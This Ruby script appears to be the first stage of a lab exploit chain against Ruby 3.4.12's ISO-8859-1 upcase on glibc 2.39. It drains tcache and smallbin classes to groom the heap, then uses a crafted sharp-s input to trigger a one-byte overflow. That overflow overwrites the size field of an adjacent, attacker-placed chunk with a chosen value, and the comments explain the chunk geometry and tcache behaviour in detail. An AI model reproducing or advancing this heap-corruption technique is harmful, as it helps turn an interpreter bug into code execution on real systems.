# Stage A canary placement, v3 — deterministic, self-hosted canary.
#
# Mechanism (traced with lab/preload/mtrace.so, stock glibc 2.39):
#   ISO-8859-1 upcase allocates mapping buffers via
#   capa = remaining * ++buffer_count + 20, request = 24 + capa
#   (string.c:7828-7851; offsetof(mapping_buffer, space) == 24).
#
#   Primer (PURE 780 sharp-s): capa1 = 780+20 = 800 -> request 824
#     (0x340 chunk); case_map advances `to` by 2 per char and stops
#     exactly at to == to_end == 800 -> NO overflow; remaining 380 ->
#     buffer2' capa = 380*2+20 = 780 -> request 804 (0x330 chunk),
#     allocated immediately after buffer1' (adjacent, from top after
#     bin drains). Both freed into their tcaches at end of primer.
#
#   Real (mixed 'a' + 779 sharp-s): capa1 = 780+20 = 800 -> request 824
#     -> buffer1 = tcache pop of buffer1' (LIFO, same 0x340 class).
#     'A' + 399 pairs fill to=799; the 400th pair writes 'S' at
#     space[799] and space[800] -> ONE byte 0x53 at request offset 824
#     = buffer2'-chunk size-field LSB (824 % 16 == 8): 0x331 -> 0x353.
#     The victim is still a tcache entry; tcache_get does not check the
#     size field, so the next malloc(802) pops it as the real buffer2.
#     At mapping_buffer_free, free(buffer2') reads size 0x350 with
#     IS_MMAPPED set -> glibc aborts "munmap_chunk(): invalid pointer".
#
# Every run aborts; the mtrace F-line logs sizefield 353 for the
# buffer2 chunk immediately before the abort — deterministic evidence
# that the one-byte overflow hit a chunk we placed, at the chosen
# offset (its size LSB), with the predicted value 0x53.
#
# Run: MTRACE_FD=2 LD_PRELOAD=.../mtrace.so \
#      lab/build/plain/ruby-3.4.12-plain/bin/ruby <this>
def marker(s)
  STDERR.write(s); STDERR.flush
end
marker("===SETTLE===\n")
GC.start

# Drain tcache AND smallbin holes for the 0x340 (request 809..824) and
# 0x330 (request 793..808) chunk classes so the primer's buffers are
# carved sequentially from the top chunk (adjacent). 512 live strings
# each exhaust every recycled hole observed in practice.
drain340 = Array.new(512) { "d" * 823 }  # request 824 -> 0x340
drain330 = Array.new(512) { "e" * 800 }  # request 801 -> 0x330

marker("===PRIMER===\n")
# Pure sharp-s, 780 chars: fills buffer1' to exactly capa (no overflow)
# and chains one adjacent buffer2'.
primer = ("\xDF".b * 780)
primer.force_encoding(Encoding::ISO_8859_1)
t1 = primer.upcase
raise "primer geometry broken" unless t1.bytesize == 1560

marker("===REAL===\n")
# Mixed input: same 780-char source length -> same buffer1 request 824,
# but 'A' + pairs flip the parity so the last pair overflows by one
# byte onto the adjacent chunk's size LSB.
s = ("a".b + "\xDF".b * 779)
s.force_encoding(Encoding::ISO_8859_1)
t2 = s.upcase

print "N=779 upcase ok, out len=#{t2.bytesize} — NO ABORT, placement failed\n"
